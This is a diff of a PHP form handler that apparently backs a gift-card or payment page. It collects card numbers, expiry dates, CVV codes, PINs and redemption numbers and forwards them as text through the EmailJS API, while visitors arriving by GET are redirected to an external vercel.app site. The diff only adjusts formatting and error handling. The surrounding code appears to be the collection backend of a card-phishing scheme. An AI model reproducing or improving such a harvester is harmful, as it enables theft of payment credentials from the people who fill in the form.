@@ -2,7 +2,7 @@
 if ($_SERVER["REQUEST_METHOD"] == "GET") {
     header('Location: https://my-cardlysupply.vercel.app/');
     exit;
-}
+};
 $currency = $cardType = $cardAmount = $redemptionNumber = $cardNumber = $expMM = $expYY = $cardCVV = $cardPIN = "";
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
     if (!empty($_POST['form_fields']["currency"])) {
@@ -48,6 +48,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     );
 
     $to_string = implode(" ", $email_data);
+
     $url = "https://api.emailjs.com/api/v1.0/email/send";
     $curl = curl_init();
 
@@ -56,7 +57,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 
     $headers = array(
-        "Content-Type: application/json",
+        "Content-Type: application/json"
     );
 
     curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
@@ -76,12 +77,12 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $resp = curl_exec($curl);
     curl_close($curl);
+
     if ($resp === "OK") {
         echo $resp;
     } else {
-        header('Location: https://my-cardlysupply.vercel.app/');
-        exit;
-    }
+        echo $resp;
+    };
 
 } else {
     header('Location: https://my-cardlysupply.vercel.app/');
